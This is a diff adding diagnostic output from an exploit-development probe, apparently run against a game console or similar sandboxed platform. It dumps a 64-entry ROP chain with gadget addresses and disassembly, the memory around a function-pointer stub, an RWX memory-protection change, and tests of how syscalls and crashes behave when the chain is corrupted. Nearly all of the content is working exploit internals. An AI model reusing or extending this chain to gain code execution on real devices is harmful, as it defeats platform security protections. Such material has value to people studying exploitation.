@@ -1,0 +1,207 @@
+=== PROBE 45c: EXECUTION REALITY CHECK ===
+
+pid: 135
+
+=== A: SETUP ===
+code page: 00000003_11204000
+mtypeprotect(RWX): done
+fn_addr ptr: 0x3110fdfd0
+fn_addr original: 00009FE5_11100130
+ropchain: 0x3110fe0f0
+
+=== B: FN_ADDR MODULE IDENTIFICATION ===
+fn_addr value: 00009FE5_11100130
+  fn_addr does NOT match any loaded module text range
+  SKIPPING code read (XO kills past pcall)
+
+=== C: SYSCTL WITH NOP FN_ADDR ===
+sysctl(NOP fn_addr): ok=true ret=0
+  output[0]=0x00000448, len=1096
+*** SYSCTL DATA RETURNED despite fn_addr=NOP! ***
+*** Chain does syscall INDEPENDENTLY of fn_addr ***
+sysctl(orig fn_addr): ok=true ret=0
+  output[0]=0x00000448, len=1096
+
+=== D: STUB OFFSET REDIRECT ===
+  fn_addr+00: ok=true ret=135
+  fn_addr+01: ok=true ret=135
+  fn_addr+02: ok=true ret=135
+  fn_addr+03: ok=true ret=135
+  fn_addr+04: ok=true ret=135
+  fn_addr+05: ok=true ret=135
+  fn_addr+06: ok=true ret=135
+  fn_addr+07: ok=true ret=135
+  fn_addr+08: ok=true ret=135
+  fn_addr+09: ok=true ret=135
+  fn_addr+10: ok=true ret=135
+  fn_addr+11: ok=true ret=135
+  fn_addr+12: ok=true ret=135
+  fn_addr+13: ok=true ret=135
+  fn_addr+14: ok=true ret=135
+  fn_addr+15: ok=true ret=135
+
+=== E: ROP CHAIN DUMP ===
+ropchain base: 0x3110fe0f0
+  [00] +0x000: 00000000_08CF4042
+  [01] +0x008: 00000000_08CF4992
+  [02] +0x010: 00000003_110FC040
+  [03] +0x018: 00000000_08D12EBB
+  [04] +0x020: 00000000_08DBDDFE
+  [05] +0x028: 00000003_110FDFD0
+  [06] +0x030: 00000000_08D86C67
+  [07] +0x038: 00000000_08CF4992
+  [08] +0x040: 00000003_110FE348
+  [09] +0x048: 00000000_08DBDDFE
+  [10] +0x050: 00000003_110FDFE0
+  [11] +0x058: 00000000_08D86C67
+  [12] +0x060: 00000000_08CF4992
+  [13] +0x068: 00000003_110FC0B0
+  [14] +0x070: 00000000_08D12EBB
+  [15] +0x078: 00000000_08DBDDFE
+  [16] +0x080: 00000003_110FE198
+  [17] +0x088: 00000000_08D86C67
+  [18] +0x090: 00000000_08CF4992
+  [19] +0x098: 00000003_11100100
+  [20] +0x0A0: 00000000_08E35FC7
+  [21] +0x0A8: 00000000_00000000
+  [22] +0x0B0: 00000000_08CF4042
+  [23] +0x0B8: 00000000_08CF4042
+  [24] +0x0C0: 00000000_08E2A970
+  [25] +0x0C8: 00000000_08CF4992
+  [26] +0x0D0: 00000000_08E2A970
+  [27] +0x0D8: 00000000_08DBDDFE
+  [28] +0x0E0: 00000003_110FE1B0
+  [29] +0x0E8: 00000000_08D86C67
+  [30] +0x0F0: 00000000_08CF4992
+  [31] +0x0F8: 00000003_110FC0A0
+  [32] +0x100: 00000000_08D12EBB
+  [33] +0x108: 00000000_08DBDDFE
+  [34] +0x110: 00000003_110FE218
+  [35] +0x118: 00000000_08D86C67
+  [36] +0x120: 00000000_08CF4991
+  [37] +0x128: 00000000_00000000
+  [38] +0x130: 00000000_08CF4992
+  [39] +0x138: 00000003_110FC090
+  [40] +0x140: 00000000_08D12EBB
+  [41] +0x148: 00000000_08DBDDFE
+  [42] +0x150: 00000003_110FE258
+  [43] +0x158: 00000000_08D86C67
+  [44] +0x160: 00000000_08CF4E64
+  [45] +0x168: 00000000_00000000
+  [46] +0x170: 00000000_08CF4992
+  [47] +0x178: 00000003_110FC080
+  [48] +0x180: 00000000_08D12EBB
+  [49] +0x188: 00000000_08DBDDFE
+  [50] +0x190: 00000003_110FE298
+  [51] +0x198: 00000000_08D86C67
+  [52] +0x1A0: 00000000_090A42D7
+  [53] +0x1A8: 00000000_00000000
+  [54] +0x1B0: 00000000_08CF4992
+  [55] +0x1B8: 00000003_110FC070
+  [56] +0x1C0: 00000000_08D12EBB
+  [57] +0x1C8: 00000000_08DBDDFE
+  [58] +0x1D0: 00000003_110FE2D8
+  [59] +0x1D8: 00000000_08D86C67
+  [60] +0x1E0: 00000000_08D0177D
+  [61] +0x1E8: 00000000_00000000
+  [62] +0x1F0: 00000000_08CF4992
+  [63] +0x1F8: 00000003_110FC060
+
+=== F: FN_PTR NEIGHBORHOOD ===
+fn_ptr: 0x3110fdfd0
+  -64: 00000003_00000000
+  -56: 00000000_00000000
+  -48: 00000000_00000000
+  -40: 33051FAD_0F7BC09B
+  -32: 00000000_00000301
+  -24: 00000001_9C930090
+  -16: 00000000_08CF4042
+  -08: 00000000_00000000
+  +00: 00009FE5_11100130 ← fn_addr
+  +08: 00000000_08CF49A2
+  +16: 00000003_110FE3E0
+  +24: 00000000_00000301
+  +32: 00000000_00000000
+  +40: 00000000_00000000
+  +48: 00000000_00000000
+  +56: 00000000_00000000
+  +64: 00000000_00000000
+  +72: 00000000_00000000
+  +80: 00000000_00000000
+  +88: 00000000_00000000
+  +96: 00000000_00000000
+  +104: 00000000_00000000
+  +112: 00000000_00000000
+  +120: 00000000_00000000
+
+=== G: PIPE STRING ===
+  address @ 0x83742cb57
+  ropchain @ 0x3110fe0f0 (size: 0x2f0)
+  fcall_stub.fn_addr: 0x3110fdfd0
+  fcall_stub.return_addr: 0x3110fdfe0
+  0x3110fe0f0: 0x8cf4042	; ret
+  0x3110fe0f8: 0x8cf4992	; pop rax; ret
+  0x3110fe100: 0x3110fc040
+  0x3110fe108: 0x8d12ebb	; mov rax, [rax]; ret
+  0x3110fe110: 0x8dbddfe	; pop rdi; ret
+  0x3110fe118: 0x3110fdfd0
+  0x3110fe120: 0x8d86c67	; mov [rdi], rax; ret
+  0x3110fe128: 0x8cf4992	; pop rax; ret
+  0x3110fe130: 0x3110fe348
+  0x3110fe138: 0x8dbddfe	; pop rdi; ret
+  0x3110fe140: 0x3110fdfe0
+  0x3110fe148: 0x8d86c67	; mov [rdi], rax; ret
+  0x3110fe150: 0x8cf4992	; pop rax; ret
+  0x3110fe158: 0x3110fc0b0
+  0x3110fe160: 0x8d12ebb	; mov rax, [rax]; ret
+  0x3110fe168: 0x8dbddfe	; pop rdi; ret
+  0x3110fe170: 0x3110fe198
+  0x3110fe178: 0x8d86c67	; mov [rdi], rax; ret
+  0x3110fe180: 0x8cf4992	; pop rax; ret
+  0x3110fe188: 0x311100100
+  0x3110fe190: 0x8e35fc7	; pop r13; pop r14; pop r15; ret
+  0x3110fe198: 0x0
+  0x3110fe1a0: 0x8cf4042	; ret
+  0x3110fe1a8: 0x8cf4042	; ret
+  0x3110fe1b0: 0x8e2a970	; mov r9, r13; call [rax + 8]
+  0x3110fe1b8: 0x8cf4992	; pop rax; ret
+  0x3110fe1c0: 0x8e2a970	; mov r9, r13; call [rax + 8]
+  0x3110fe1c8: 0x8dbddfe	; pop rdi; ret
+  0x3110fe1d0: 0x3110fe1b0
+  0x3110fe1d8: 0x8d86c67	; mov [rdi], rax; ret
+  0x3110fe1e0: 0x8cf4992	; pop rax; ret
+  0x3110fe1e8: 0x3110fc0a0
+  0x3110fe1f0: 0x8d12ebb	; mov rax, [rax]; ret
+  0x3110fe1f8: 0x8dbddfe	; pop rdi; ret
+  0x3110fe200: 0x3110fe218
+  0x3110fe208: 0x8d86c67	; mov [rdi], rax; ret
+  [truncated]
+
+=== H: CRASH TEST — UD2 ===
+ud2: ok=true ret=135
+NO CRASH — ud2 did not trigger
+
+=== I: CRASH TEST — UNMAPPED ADDR ===
+unmapped: ok=true
+NO CRASH — chain does not call fn_addr (or catches all faults)
+
+=== J: CRASH TEST — NULL ===
+null: ok=true
+NO CRASH — chain survived null fn_addr
+
+=== K: ROP CHAIN CORRUPTION ===
+corrupted chain[0..7] with 0x41414141_41414141
+getpid after corruption: ok=true ret=135
+*** CHAIN NOT USED! Syscall bypasses the ROP chain entirely ***
+*** make_syscall() goes through a different code path ***
+
+=== L: EBOOT INFO ===
+eboot text base: 00000000_08CF4000
+eboot text size: 00000005_00494000
+fn_addr value:   00009FE5_11100130
+fn_addr is NOT in eboot text section
+
+=== M: CLEANUP ===
+fn_addr restored, getpid ok=true
+
+=== PROBE 45c COMPLETE ===
